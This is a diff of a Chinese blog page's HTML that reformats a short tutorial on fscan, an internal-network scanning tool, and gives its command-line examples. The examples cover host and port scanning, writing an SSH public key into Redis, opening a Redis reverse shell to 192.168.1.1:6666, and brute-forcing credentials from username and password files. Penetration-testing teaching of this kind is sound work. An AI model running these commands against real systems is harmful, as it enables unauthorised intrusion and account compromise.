@@ -470,35 +470,21 @@
             <div id="articleContent">
                 <h1 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h1><h2 id="1-1-工具介绍"><a href="#1-1-工具介绍" class="headerlink" title="1.1     工具介绍"></a>1.1     工具介绍</h2><p>fscan 是一个内网综合扫描工具，方便一键自动化、全方位漏洞扫描。它支持主机存活探测、端口扫描、常见服务的爆破、redis批量写公钥、计划任务反弹shell等功能。</p>
 <h2 id="1-2-下载安装"><a href="#1-2-下载安装" class="headerlink" title="1.2     下载安装"></a>1.2     下载安装</h2><p>直接安装使用，打开cmd切换到 fscan.exe 目录，使用以下命令。</p>
-<p><img src="D:\BLOG\source_posts\fscan\image-20231123150353092.png" alt="image-20231123150353092"></p>
-<h2 id="1-3-参数命令"><a href="#1-3-参数命令" class="headerlink" title="1.3     参数命令"></a>1.3     参数命令</h2><h3 id="1-3-1-端口扫描"><a href="#1-3-1-端口扫描" class="headerlink" title="1.3.1   端口扫描"></a>1.3.1   端口扫描</h3><p>fscan.exe -h xxx.com</p>
-<p><img src="D:\BLOG\source_posts\fscan\image-20231123150404157.png" alt="image-20231123150404157"></p>
-<h3 id="1-3-2-存活主机扫描"><a href="#1-3-2-存活主机扫描" class="headerlink" title="1.3.2   存活主机扫描"></a>1.3.2   存活主机扫描</h3><p>fscan.exe -h  网 段  -ping</p>
-<p><img src="D:\BLOG\source_posts\fscan\image-20231123150413512.png" alt="image-20231123150413512"></p>
-<h3 id="1-3-3-跳跃扫描"><a href="#1-3-3-跳跃扫描" class="headerlink" title="1.3.3   跳跃扫描"></a>1.3.3   跳跃扫描</h3><ul>
-<li><p>跳过存活检测 、不保存文件、跳过web poc扫描。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan.exe -h 192.168.1.1/24 -np -no -nopoc </span><br></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="1-3-4-Redis写公钥"><a href="#1-3-4-Redis写公钥" class="headerlink" title="1.3.4   Redis写公钥"></a>1.3.4   Redis写公钥</h3><ul>
-<li><pre><code class="bash">fscan.exe -h 192.168.78.128 -rf id_rsa.pub
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 1.3.5   Redis反弹shell</span><br><span class="line"></span><br><span class="line">- ```bash</span><br><span class="line">  fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666</span><br></pre></td></tr></table></figure>
-</code></pre>
-</li>
-</ul>
-<h3 id="1-3-6-指定模块ssh和端口"><a href="#1-3-6-指定模块ssh和端口" class="headerlink" title="1.3.6   指定模块ssh和端口"></a>1.3.6   指定模块ssh和端口</h3><ul>
-<li><pre><code class="bash">fscan.exe -h 192.168.1.1/24 -m ssh -p 2222
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">### 1.3.7   爆破</span><br><span class="line"></span><br><span class="line">- 加载指定文件的用户名、密码来进行爆破。</span><br><span class="line"></span><br><span class="line">- ```bash</span><br><span class="line">  fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt </span><br></pre></td></tr></table></figure>
-</code></pre>
-</li>
-</ul>
-<h3 id="1-3-8-保存"><a href="#1-3-8-保存" class="headerlink" title="1.3.8   保存"></a>1.3.8   保存</h3><ul>
-<li><p>指定扫描结果保存路径,默认保存在当前路径</p>
-</li>
-<li><pre><code class="bash">fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">### 1.3.9   文件导入</span><br><span class="line"></span><br><span class="line">- ```bash</span><br><span class="line">  fscan.exe -hf ip.txt</span><br></pre></td></tr></table></figure>
-</code></pre>
-</li>
-</ul>
+<p><img src="D:\BLOG\source_posts\fscan\1.png" alt="1"></p>
+<h2 id="1-3-参数命令"><a href="#1-3-参数命令" class="headerlink" title="1.3     参数命令"></a>1.3     参数命令</h2><h3 id="1-3-1-端口扫描"><a href="#1-3-1-端口扫描" class="headerlink" title="1.3.1   端口扫描"></a>1.3.1   端口扫描</h3><p><code>fscan.exe -h xxx.com</code></p>
+<p><img src="D:\BLOG\source_posts\fscan\1.png" alt="1"></p>
+<h3 id="1-3-2-存活主机扫描"><a href="#1-3-2-存活主机扫描" class="headerlink" title="1.3.2   存活主机扫描"></a>1.3.2   存活主机扫描</h3><p><code>fscan.exe -h  网 段  -ping</code></p>
+<p><img src="D:\BLOG\source_posts\fscan\3.png" alt="3"></p>
+<h3 id="1-3-3-跳跃扫描"><a href="#1-3-3-跳跃扫描" class="headerlink" title="1.3.3   跳跃扫描"></a>1.3.3   跳跃扫描</h3><p>跳过存活检测 、不保存文件、跳过web poc扫描。</p>
+<p><code>fscan.exe -h 192.168.1.1/24 -np -no -nopoc</code> </p>
+<h3 id="1-3-4-Redis写公钥"><a href="#1-3-4-Redis写公钥" class="headerlink" title="1.3.4   Redis写公钥"></a>1.3.4   Redis写公钥</h3><p><code>fscan.exe -h 192.168.78.128 -rf id_rsa.pub</code></p>
+<h3 id="1-3-5-Redis反弹shell"><a href="#1-3-5-Redis反弹shell" class="headerlink" title="1.3.5   Redis反弹shell"></a>1.3.5   Redis反弹shell</h3><p><code>fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666</code></p>
+<h3 id="1-3-6-指定模块ssh和端口"><a href="#1-3-6-指定模块ssh和端口" class="headerlink" title="1.3.6   指定模块ssh和端口"></a>1.3.6   指定模块ssh和端口</h3><p><code>fscan.exe -h 192.168.1.1/24 -m ssh -p 2222</code></p>
+<h3 id="1-3-7-爆破"><a href="#1-3-7-爆破" class="headerlink" title="1.3.7   爆破"></a>1.3.7   爆破</h3><p>加载指定文件的用户名、密码来进行爆破。</p>
+<p><code>fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt</code> </p>
+<h3 id="1-3-8-保存"><a href="#1-3-8-保存" class="headerlink" title="1.3.8   保存"></a>1.3.8   保存</h3><p>指定扫描结果保存路径,默认保存在当前路径</p>
+<p><code>fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt</code> </p>
+<h3 id="1-3-9-文件导入"><a href="#1-3-9-文件导入" class="headerlink" title="1.3.9   文件导入"></a>1.3.9   文件导入</h3><p><code>fscan.exe -hf ip.txt</code></p>
 
                 
             </div>
